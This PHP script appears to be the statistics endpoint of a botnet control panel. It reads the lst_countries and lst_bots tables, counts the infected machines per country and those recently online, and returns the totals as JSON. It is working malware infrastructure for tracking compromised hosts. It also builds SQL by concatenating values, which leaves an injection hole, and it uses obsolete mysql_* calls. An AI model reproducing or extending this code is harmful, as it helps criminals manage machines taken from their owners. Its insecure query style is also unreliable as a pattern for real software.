<?php
include('auth.php');
include("./inc/config.php");
require_once("./JSON.php");
$sql = "SELECT * FROM `lst_countries` WHERE 1;";  
$res = mysql_query($sql);
$nbrows = mysql_num_rows($res);
$intervall = time() - ($setminutes * 60);
$totalcountries = 0;
$totalonline = 0;
if($nbrows>0) {
    while($rec = mysql_fetch_array($res)) {
        $totalcountries = $totalcountries + $rec['totalbots'];
        $online = 0;
        $sql2 = "SELECT * FROM `lst_bots` WHERE `lasttime` >= '".$intervall."' AND `country` = '".$rec['countryname']."';";
        $res2 = mysql_query($sql2);
        $nbrows2 = mysql_num_rows($res2);
        if($nbrows2>0)
        {
            while($rec2 = mysql_fetch_array($res2)) {
                    $online = $online + 1;
            }
        }
        $totalonline = $totalonline + $online;
        $rec2 = array("0"=>"6","ID"=>"","1"=>"","countryname"=>$rec['countryname'],"2"=>"TOTAL","countrycode"=>$rec['countrycode'],"3"=>"5","totalbots"=>$rec['totalbots'],"online"=>$online);
        $arr[] = $rec2;
    }
    $rec2 = array("0"=>"6","ID"=>"","1"=>"","countryname"=>"<b>Total Bots</b>","2"=>"TOTAL","countrycode"=>"TOTAL","3"=>"5","totalbots"=>$totalcountries,"online"=>$totalonline);
    $arr[] = $rec2;
    $nbrows = $nbrows+ 1;
    $jsonresult = json_encode($arr);
    echo '{"results":'.$jsonresult.', "total":"'.$nbrows.'"}';
} else {
    $rec = array("0"=>"6","ID"=>"","1"=>"","countryname"=>"<b>Total Bots</b>","2"=>"TOTAL","countrycode"=>"TOTAL","3"=>"5","totalbots"=>$totalcountries,"online"=>$totalonline);
    $arr[] = $rec;
    $jsonresult = json_encode($arr);
    echo '{"results":'.$jsonresult.', "total":1}';
}
die("");
?>